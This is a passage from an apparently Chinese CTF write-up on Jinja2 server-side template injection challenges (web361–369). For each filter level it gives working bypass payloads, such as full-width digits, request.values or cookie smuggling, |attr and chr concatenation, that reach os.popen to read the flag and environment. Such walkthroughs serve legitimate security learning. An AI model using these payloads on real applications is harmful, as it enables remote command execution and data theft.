single-quoted-string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac /flag'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">?</span>name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>lipsum<span class="token operator">.</span>__globals__<span class="token punctuation">[</span><span class="token string single-quoted-string">'os'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token function">popen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac ../flag'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">?</span>name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>cycler<span class="token operator">.</span>__init__<span class="token operator">.</span>__globals__<span class="token operator">.</span>os<span class="token operator">.</span><span class="token function">popen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ls'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">?</span>name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>config<span class="token operator">.</span>__class__<span class="token operator">.</span>__init__<span class="token operator">.</span>__globals__<span class="token punctuation">[</span><span class="token string single-quoted-string">'os'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token function">popen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac /flag'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="web362-æ•°å­—ç»•è¿‡-half2full"><a href="#web362-æ•°å­—ç»•è¿‡-half2full" class="headerlink" title="web362(æ•°å­—ç»•è¿‡ half2full)"></a>web362(æ•°å­—ç»•è¿‡ half2full)</h4><p>ç»è¿‡æµ‹è¯•è¿‡æ»¤äº†æ•°å­—2å’Œ3ï¼Œä½†æ˜¯å‘ç°å¯ä»¥140-8å“ˆå“ˆå“ˆ</p><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">140</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'tac /flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>æœ‰å¤§ä½¬æ¢æˆäº†å…¨è§’æ•°å­—ä¹Ÿå¯ä»¥</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">half2full</span><span class="token punctuation">(</span>half<span class="token punctuation">)</span><span class="token punctuation">:</span>      full <span class="token operator">=</span> <span class="token string">''</span>      <span class="token keyword">for</span> ch <span class="token keyword">in</span> half<span class="token punctuation">:</span>          <span class="token keyword">if</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>              ch <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0xfee0</span><span class="token punctuation">)</span>          <span class="token keyword">elif</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">32</span><span class="token punctuation">:</span>              ch <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x3000</span><span class="token punctuation">)</span>          <span class="token keyword">else</span><span class="token punctuation">:</span>              <span class="token keyword">pass</span>          full <span class="token operator">+=</span> ch      <span class="token keyword">return</span> full  t<span class="token operator">=</span><span class="token string">''</span>s<span class="token operator">=</span><span class="token string">"0123456789"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>    t<span class="token operator">+=</span><span class="token string">'\''</span><span class="token operator">+</span>half2full<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\','</span><span class="token keyword">print</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span></code></pre><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span>ï¼<span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>ï¼‘ï¼“ï¼’<span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'tac /flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>æˆ–è€…ä½¿ç”¨å…¶ä»–æ–¹æ³•</p><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>x<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('cat /flag').read()"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment"># x å¯ä»¥ä¸ºä»»æ„è‹±æ–‡å­—æ¯æˆ–å­—æ¯ç»„åˆ</span>?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('cat /flag').read()"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="web363-å¼•å·"><a href="#web363-å¼•å·" class="headerlink" title="web363(å¼•å·)"></a>web363(å¼•å·)</h4><p>è¿‡æ»¤äº†å•å¼•å·ã€åŒå¼•å·</p><p><strong>GETä¼ å‚ç»•è¿‡</strong></p><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>a<span class="token punctuation">]</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>b<span class="token punctuation">]</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>a<span class="token operator">=</span>os<span class="token operator">&amp;</span>b<span class="token operator">=</span>popen<span class="token operator">&amp;</span>c<span class="token operator">=</span>cat <span class="token operator">/</span>flag</code></pre><p><strong>å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'0'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">42</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'s'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'p'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">43</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'e'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">90</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'n'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'t'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'a'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">591</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'c'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">' '</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">853</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'/'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'f'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">41</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'l'</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token string">'g'</span>?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">42</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token comment"># %2B -> +</span><span class="token comment"># ?name=&#123;&#123;url_for.__globals__['os']&#125;&#125;</span>?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">42</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">43</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">90</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">591</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">853</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">41</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span>2B<span class="token punctuation">(</span>config<span class="token punctuation">.</span>__str__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment"># ?name=&#123;&#123;url_for.__globals__['os']['popen']('tac /flag')&#125;&#125;</span></code></pre><p><strong>chræ‹¼æ¥</strong></p><p>å…ˆæ‰¾å‡º chr å‡½æ•°ï¼ŒåŒè¿‡ chr æ‹¼æ¥</p><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> <span class="token builtin">chr</span><span class="token operator">=</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">.</span><span class="token builtin">chr</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">print</span>  url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">111</span><span class="token punctuation">)</span><span class="token operator">%</span>2bchr<span class="token punctuation">(</span><span class="token number">115</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token operator">%</span><span class="token punctuation">&#125;</span></code></pre><p><strong>é€šè¿‡è¿‡æ»¤å™¨æ‹¼æ¥</strong></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>select<span class="token operator">|</span>string<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span></code></pre><h4 id="web364"><a href="#web364" class="headerlink" title="web364"></a>web364</h4><p>å¤šè¿‡æ»¤äº†argsï¼Œç”¨ä¸Šä¸€ä¸ªå­—ç¬¦ä¸²æ‹¼æ¥ä¹Ÿå¯ä»¥</p><p>è¿‡æ»¤äº†å•åŒå¼•å·ï¼Œargs</p><p>values å¯ä»¥è·å–æ‰€æœ‰å‚æ•°ï¼Œä»è€Œç»•è¿‡ args</p><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>lipsum<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>ocean<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>ocean<span class="token operator">=</span>cat <span class="token operator">/</span>flag</code></pre><p>ä¹Ÿå¯ä»¥é€šè¿‡ cookie ç»•è¿‡</p><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>a<span class="token punctuation">]</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>b<span class="token punctuation">]</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>a<span class="token operator">=</span>os<span class="token punctuation">;</span>b<span class="token operator">=</span>popen<span class="token punctuation">;</span>c<span class="token operator">=</span>cat <span class="token operator">/</span>flag</code></pre><p><a href="https://blog.csdn.net/miuzzx/article/details/110220425">SSTIæ¨¡æ¿æ³¨å…¥ç»•è¿‡ï¼ˆè¿›é˜¶ç¯‡ï¼‰</a></p><h4 id="web365-è¿‡æ»¤"><a href="#web365-è¿‡æ»¤" class="headerlink" title="web365(è¿‡æ»¤[])"></a>web365(è¿‡æ»¤[])</h4><p>fuzz å­—å…¸è·‘ä¸€éï¼Œå‘ç°å•åŒå¼•å·ã€argsã€[]è¢«è¿‡æ»¤</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># GETä¼ å‚</span>?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>lipsum<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>a<span class="token operator">=</span>tac <span class="token operator">/</span>flag<span class="token comment"># cookie</span>?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>Cookie<span class="token punctuation">:</span>c<span class="token operator">=</span>cat <span class="token operator">/</span>flag<span class="token comment"># __getitem__ å¯ä»¥ä»£æ›¿æ–¹æ‹¬å·</span>?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>g<span class="token punctuation">.</span>pop<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">.</span>__getitem__<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>x<span class="token punctuation">)</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>xx<span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>xxx<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>Cookie<span class="token punctuation">:</span> x<span class="token operator">=</span><span class="token builtin">__import__</span><span class="token punctuation">;</span>xx<span class="token operator">=</span>os<span class="token punctuation">;</span>xxx<span class="token operator">=</span>env</code></pre><h4 id="web366-è¿‡æ»¤-attr"><a href="#web366-è¿‡æ»¤-attr" class="headerlink" title="web366(è¿‡æ»¤__  attr)"></a>web366(è¿‡æ»¤__  attr)</h4><p>è¿‡æ»¤äº†<code>_</code> <code>&#39;</code> <code>&quot;</code> <code>[</code>      <code>|attr</code> å¯ä»£æ›¿ <code>.</code></p><p>Payload:</p><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span>lipsum<span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>a<span class="token operator">=</span>__globals__<span class="token operator">&amp;</span>b<span class="token operator">=</span>tac <span class="token operator">/</span>flag</code></pre><h4 id="web367-è¿‡æ»¤os"><a href="#web367-è¿‡æ»¤os" class="headerlink" title="web367(è¿‡æ»¤os)"></a>web367(è¿‡æ»¤os)</h4><p>Payload:</p><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span>lipsum<span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>a<span class="token operator">=</span>__globals__<span class="token operator">&amp;</span>b<span class="token operator">=</span>os<span class="token operator">&amp;</span>c<span class="token operator">=</span>cat <span class="token operator">/</span>flag?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>lipsum<span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>c<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>d<span class="token punctuation">)</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>ocean<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>f<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>ocean<span class="token operator">=</span>cat <span class="token operator">/</span>flag<span class="token operator">&amp;</span>a<span class="token operator">=</span>__globals__<span class="token operator">&amp;</span>b<span class="token operator">=</span>__getitem__<span class="token operator">&amp;</span>c<span class="token operator">=</span>os<span class="token operator">&amp;</span>d<span class="token operator">=</span>popen<span class="token operator">&amp;</span>f<span class="token operator">=</span>read</code></pre><h4 id="web368-è¿‡æ»¤åŒ"><a href="#web368-è¿‡æ»¤åŒ" class="headerlink" title="web368(è¿‡æ»¤åŒ{)"></a>web368(è¿‡æ»¤åŒ{)</h4><p>å¯ç”¨ <code>&#123;%print(payload)%&#125;</code> ä»£æ›¿ <code>&#123;&#123;payload&#125;&#125;</code></p><pre class="language-python" data-language="python"><code class="language-python">?name<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">(</span>lipsum<span class="token operator">|</span>attr<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>c<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token operator">&amp;</span>a<span class="token operator">=</span>__globals__<span class="token operator">&amp;</span>b<span class="token operator">=</span>os<span class="token operator">&amp;</span>c<span class="token operator">=</span>tac <span class="token operator">/</span>flag</code></pre><h4 id="web369-è¿‡æ»¤request"><a href="#web369-è¿‡æ»¤request" class="headerlink" title="web369(è¿‡æ»¤request)"></a>web369(è¿‡æ»¤request)</h4><p>æ²¡äº† requestï¼Œè¦è‡ªå·±æ‹¼å­—ç¬¦äº†ã€‚</p><p><a href="https://jinja.palletsprojects.com/en/3.1.x/templates/#builtin-filters">List of Builtin Filters</a></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> pop<span class="token operator">=</span><span class="token builtin">dict</span><span class="token punctuation">(</span>p<span class="token operator">=</span>a<span class="token punctuation">,</span>op<span class="token operator">=</span>a<span class="token punctuation">)</span><span class="token operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span> <span class="token comment">#pop</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> lo<span class="token operator">=</span><span class="token punctuation">(</span>x<span class="token operator">|</span>reject<span class="token operator">|</span>string<span class="token operator">|</span><span class="token builtin">list</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>pop<span class="token punctuation">)</span><span class="token 